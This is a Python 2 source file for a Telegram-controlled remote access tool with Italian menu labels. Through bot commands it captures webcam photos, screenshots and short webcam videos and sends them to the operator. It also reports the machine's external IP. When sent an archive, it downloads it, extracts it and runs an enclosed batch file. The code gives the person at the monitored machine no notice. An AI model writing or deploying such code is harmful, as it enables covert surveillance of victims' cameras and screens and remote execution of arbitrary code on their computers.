#!/usr/bin/python
# -*- coding: utf-8 -*-
import wx
import subprocess
import socket
import sys
import time
import telepot
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import cv2
import urllib2
import pygame.camera
import pygame.image
import os
import shutil

__author__ = 'Francesco De Lucia'
__license__ = 'Public Domain'
__version__ = '0.2'


TOKEN = "TELGRAM_BOT_TOKEN" 

INST_DIR = "c:\\temp\\"
REMOTE_FILE_NAME = "go.7z"
REMOTE_FOLDER = "go"
REMOTE_OPERATION = INST_DIR + "go\execute.bat"


Cpture = False

class tbot:
    
    TOKEN = "" 
    bot = None
   
    
    def __init__(self,TOKEN):
        print __author__
        print __version__
        self.TOKEN = TOKEN
        
    
    def begin(self):    
        self.bot = telepot.Bot(self.TOKEN)
        self.bot.message_loop({'chat':self.on_chat_message,'callback_query':self.on_callback_query})        
        
        while 1:
            time.sleep(10)        
    
    def on_chat_message(self,msg):
        content_type, chat_type, chat_id = telepot.glance(msg)
        
        #print content_type 
        print msg
        if content_type == 'text':
            keyboard = InlineKeyboardMarkup(inline_keyboard=[				
                    [InlineKeyboardButton(text='Dammi Ext. IP', callback_data='extip')],
                    [InlineKeyboardButton(text='Cattura Camera', callback_data='webcam')],
                    [InlineKeyboardButton(text='Cattura Desktop', callback_data='desk')],
	            [InlineKeyboardButton(text='Video 5 Sec', callback_data='vid5')],
	            [InlineKeyboardButton(text='Video 10 Sec', callback_data='vid10')],])
            self.bot.sendMessage(chat_id, 'Scegli Opzione', reply_markup=keyboard)
            
        if content_type == 'photo':
            file_name = "232323"
            for x in msg['photo']:
                if 'file_path' in x:
                    file_name = str(x['file_path']).split('/')[1]
            os.remove(file_name)
            self.bot.download_file(msg['photo'][-1]['file_id'], file_name)
        
        if content_type == 'document':
            print os.getcwd()
            try:
                os.remove(INST_DIR + REMOTE_FOLDER)
            except Exception as e:
                print e.message              
            try:
                shutil.rmtree(INST_DIR + REMOTE_FOLDER)            
            except Exception as e:
                print e.message
            print "scarico il file"
            self.bot.download_file(msg['document']['file_id'], INST_DIR + REMOTE_FILE_NAME)
            print "File scaricato"
            time.sleep(5)
            if msg['document']['file_name'] == REMOTE_FILE_NAME:
                try:
                    print "estraggo il file"
                    output = subprocess.Popen(["7za","x","-y", str(INST_DIR +  REMOTE_FILE_NAME),str("-o" + INST_DIR)])
                    print "Aspetto"
                    time.sleep(1)
                    print "Eseguo operazione"
                    output = subprocess.Popen([REMOTE_OPERATION])
                    print "OPerazione eseguita"
                except Exception as e:
                    print e.message
                    
                    
    def callBackDesktop(self,query_id,from_id):
        try:               
    
            time_delay = 0
            file_name = "c:\\temp\\capture.png"
    
            app = wx.App()
            
            # capture screen and save it to file
            screen = wx.ScreenDC()
            size = screen.GetSize()
            bmp = wx.EmptyBitmap(size[0], size[1])
            mem = wx.MemoryDC(bmp)
            mem.Blit(0,0,size[0], size[1], screen, 0, 0)
            del mem
            bmp.SaveFile(file_name , wx.BITMAP_TYPE_PNG)
            time.sleep(2)
            response = self.bot.sendPhoto(from_id, open(file_name,"rb"))      
            
        except Exception as e:
		print e.message
        	self.bot.answerCallbackQuery(query_id, text="Error:" + e.message)        
    
    
    def callBackWebCam(self,query_id,from_id):
        try:
            
            file_name = "c:\\temp\\cam.jpg"
            
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
            out = cv2.imwrite(file_name, frame)        
            cap.release()
            cv2.destroyAllWindows()        
        
            time.sleep(2)
            response = self.bot.sendPhoto(from_id, open(file_name,"rb"))        
        except Exception as e:
		print e.message		
		self.bot.answerCallbackQuery(query_id, text="Error:" + e.message)   
		
    def callBackVideo(self,query_id,from_id,timesize):
	try:
	    # find the webcam
	    capture = cv2.VideoCapture(0)
	
	    # video recorder
	    fourcc = cv2.cv.CV_FOURCC(*'XVID')  # cv2.VideoWriter_fourcc() does not exist
	    #fourcc = cv2.cv.CV_FOURCC('M','J','P','G') 
	    #fourcc = cv2.cv.CV_FOURCC('M','P','4','1')
	    #fourcc = cv2.cv.CV_FOURCC('M','P','4','2')
	    #fourcc = cv2.cv.CV_FOURCC('P','I','M','1')
	    #fourcc = cv2.cv.CV_FOURCC('U', '2', '6', '3')
	    #fourcc = cv2.cv.CV_FOURCC('F', 'L', 'V', '1')
	    ext = 'avi'
	    filename = "output." + ext 
	    videoOut = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
	    
	
	    start = time.time()
	
	    #cv2.imshow('Video Stream', frame)    
	    while (True):
		ret, frame = capture.read()
		videoOut.write(frame)        
		done = time.time()
		elapsed = int(done - start)
		if elapsed >= timesize + 1:
		    break
	
	    capture.release()
	    videoOut.release()
	    time.sleep(.5)
	    response = self.bot.sendVideo(from_id, open(filename,"rb")) 	
	except Exception as e:
	    print e.message
	    self.bot.answerCallbackQuery(query_id, text="Error:" + e.message)     	
	    #cv2.destroyAllWindows()    
     
    
    def on_callback_query(self,msg):
        query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
        print msg
           
        if query_data == "extip":
            content = urllib2.urlopen("http://ipecho.net/plain").read()
            self.bot.answerCallbackQuery(query_id, text="Internet IP:" + content)
            
        elif query_data == "webcam":
            self.callBackWebCam(query_id,from_id)
                
        elif query_data == "desk":    
            self.callBackDesktop(query_id,from_id)            
	elif query_data == "vid5":    
	    self.callBackVideo(query_id,from_id,5)            
	elif query_data == "vid10":    
	    self.callBackVideo(query_id,from_id,10)            	
  

t = tbot(TOKEN)
t.begin()


    
    
